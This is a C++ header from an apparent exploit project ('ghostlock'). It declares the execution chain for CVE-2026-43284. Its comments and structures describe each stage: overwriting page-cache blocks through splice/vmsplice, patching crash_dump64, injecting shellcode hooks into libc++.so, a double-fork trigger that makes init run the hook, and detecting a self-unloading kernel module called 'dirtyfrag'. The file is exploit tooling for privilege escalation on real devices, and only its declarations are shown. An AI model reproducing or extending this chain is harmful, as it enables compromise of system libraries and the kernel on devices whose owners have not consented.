#ifndef GHOSTLOCK_BACKEND_CVE_2026_43284_REAL_OPS_HPP
#define GHOSTLOCK_BACKEND_CVE_2026_43284_REAL_OPS_HPP

/* Device bindings for CVE-2026-43284 ChainOps.
 *
 * B5-9a shipped the read-only subset (plain pread over a caller-owned fd).
 * B5-9c adds the real execution half behind an explicit operator flag:
 *
 *   write      pagecache::make_file_cache_write_ops() over real_splice_io()
 *              (real pipe2/splice/vmsplice/send) -- the ESP/CBC page-cache
 *              block write;
 *   read_block pread(2) over the same target fd (old-block journal + verify);
 *   trigger    the double-fork init sentry of exp.c createOrphanProcess: the
 *              intermediate child exits at once so the grandchild is reparented
 *              to init and its exit makes init log through the hooked libc++;
 *              when exec_path is set the grandchild execve()s it first;
 *   wait       LKM/UMH terminus probe over the injected DeviceProbeOps: the
 *              module success/failure marker or the loaded module directory;
 *   release    closes the target/socket fds, wipes the SA secrets and marks the
 *              context released. Runs exactly once through the chain terminus.
 *
 * RealChainContext is standard-layout with the PageCacheWriteContext as its
 * first member, so the single ctx pointer ChainOps threads through
 * write.ctx is pointer-interconvertible with both views. run_ready() is true
 * only when every binding exists AND the DeviceProbeOps surface is available;
 * a partial binding therefore fails closed instead of silently skipping a
 * stage.
 *
 * The device never runs any of this unless the operator passes the explicit
 * --run-cve-2026-43284 entry point; backend_available(Cve2026_43284) and
 * selection_supported() stay false. On a non-Linux host real_splice_io() and
 * the double-fork are unavailable, so the surface stays unbound. */

#include "backend/cve_2026_43284/pagecache/pagecache.hpp"
#include "backend/cve_2026_43284/steps/chain.hpp"
#include "backend/cve_2026_43284/steps/crash_dump.hpp"
#include "backend/cve_2026_43284/steps/hook_patch.hpp"
#include "platform/device_facts.hpp"

#include <cstddef>
#include <cstdint>
#include <string_view>

namespace ghostlock::backend::cve_2026_43284 {

    struct ReadOnlyChainContext final {
        int fd = -1;
    };

    long real_read_block(void *ctx, std::uint64_t offset,
                         std::uint8_t out[16]) noexcept;

    [[nodiscard]] steps::ChainOps make_read_only_chain_ops(
            ReadOnlyChainContext &ctx) noexcept;

    inline constexpr char kLkmSuccessMarker[] = "/dev/dfm0";
    inline constexpr char kLkmFailureMarker[] = "/dev/dfm1";
    /* The libc++ shellcode mutex marker ("module loading in flight"). Not
     * terminal: the wait keeps polling past it. */
    inline constexpr char kLkmHookMarker[] = "/dev/df";
    /* Module directory; observed present then absent == the LKM finished (it
     * returns -E2BIG after the UMH completes and self-unloads). */
    inline constexpr char kLkmModulePath[] = "/sys/module/dirtyfrag";

    struct RealChainContext final {
        PageCacheWriteContext page{};
        platform::DeviceProbeOps device{};
        const char *exec_path = nullptr;
        std::uint32_t trigger_delay_ms = 1000U;
        bool triggered = false;
        bool released = false;

        /* Carrier path for the vendor read bridge and the dev-only file-source
         * hatch. When allow_dev_carrier_path is true the read bridge is not
         * used (the dev target is directly readable) and patch #1 is skipped. */
        const char *target_path = nullptr;
        bool allow_dev_carrier_path = false;
        /* Read bridge + helper write source for vendor carriers. When the App
         * cannot open the vendor target at all, make_real_chain_ops binds both
         * fallbacks so the page-cache write still completes (exp.c
         * patch_file_cbc use_helper=1). */
        steps::CrashDumpBridgeOps bridge{};

        /* patch #1: a second page-cache context bound to crash_dump64, sharing
         * the session SA/socket/io with page. crash_dump_fd < 0 disables it. */
        int crash_dump_fd = -1;

        /* libc++ hook: caller-owned image, shellcode template and buffers, plus
         * the page-cache surface bound to libc++.so. Unconfigured (null image
         * or non-available hook_io) makes apply_hook fail closed. */
        const std::uint8_t *libcxx_image = nullptr;
        std::size_t libcxx_image_size = 0U;
        std::string_view hook_symbol{};
        steps::HookGuardPolicy hook_guard = steps::HookGuardPolicy::Reject;
        const steps::ShellcodeTemplate *hook_template = nullptr;
        const steps::ShellcodeBinding *hook_bindings = nullptr;
        std::size_t hook_binding_count = 0U;
        std::size_t hook_displaced_slot = steps::kHookDisplacedNone;
        std::uint8_t *hook_shellcode = nullptr;
        std::size_t hook_shellcode_cap = 0U;
        std::uint8_t *hook_shellcode_orig = nullptr;
        steps::HookPatchIo hook_io{};
        steps::HookPatchPlan hook_plan{};
        /* True once a valid plan (with saved originals) exists and the terminus
         * owes a restore; set before the first apply write. */
        bool hook_applied = false;

        [[nodiscard]] bool run_ready() noexcept;
        [[nodiscard]] bool released_cleanly() const noexcept { return released; }
    };

    [[nodiscard]] steps::ChainOps make_real_chain_ops(
            RealChainContext &ctx) noexcept;

    long real_chain_read_block(void *ctx, std::uint64_t offset,
                               std::uint8_t out[16]) noexcept;
    /* ChainOps callbacks for the new endgame stages. */
    steps::ChainError real_chain_patch_crash_dump(void *ctx) noexcept;
    steps::ChainError real_chain_apply_hook(void *ctx) noexcept;
    void real_chain_restore_hook(void *ctx) noexcept;
    int real_chain_trigger(void *ctx) noexcept;
    steps::ChainWaitOutcome real_chain_wait_result(void *ctx,
                                                   std::uint32_t timeout_ms) noexcept;
    void real_chain_release(void *ctx) noexcept;

    [[nodiscard]] std::string_view chain_error_name(steps::ChainError error) noexcept;
    [[nodiscard]] std::string_view chain_wait_name(
            steps::ChainWaitOutcome outcome) noexcept;

} // namespace ghostlock::backend::cve_2026_43284

#endif
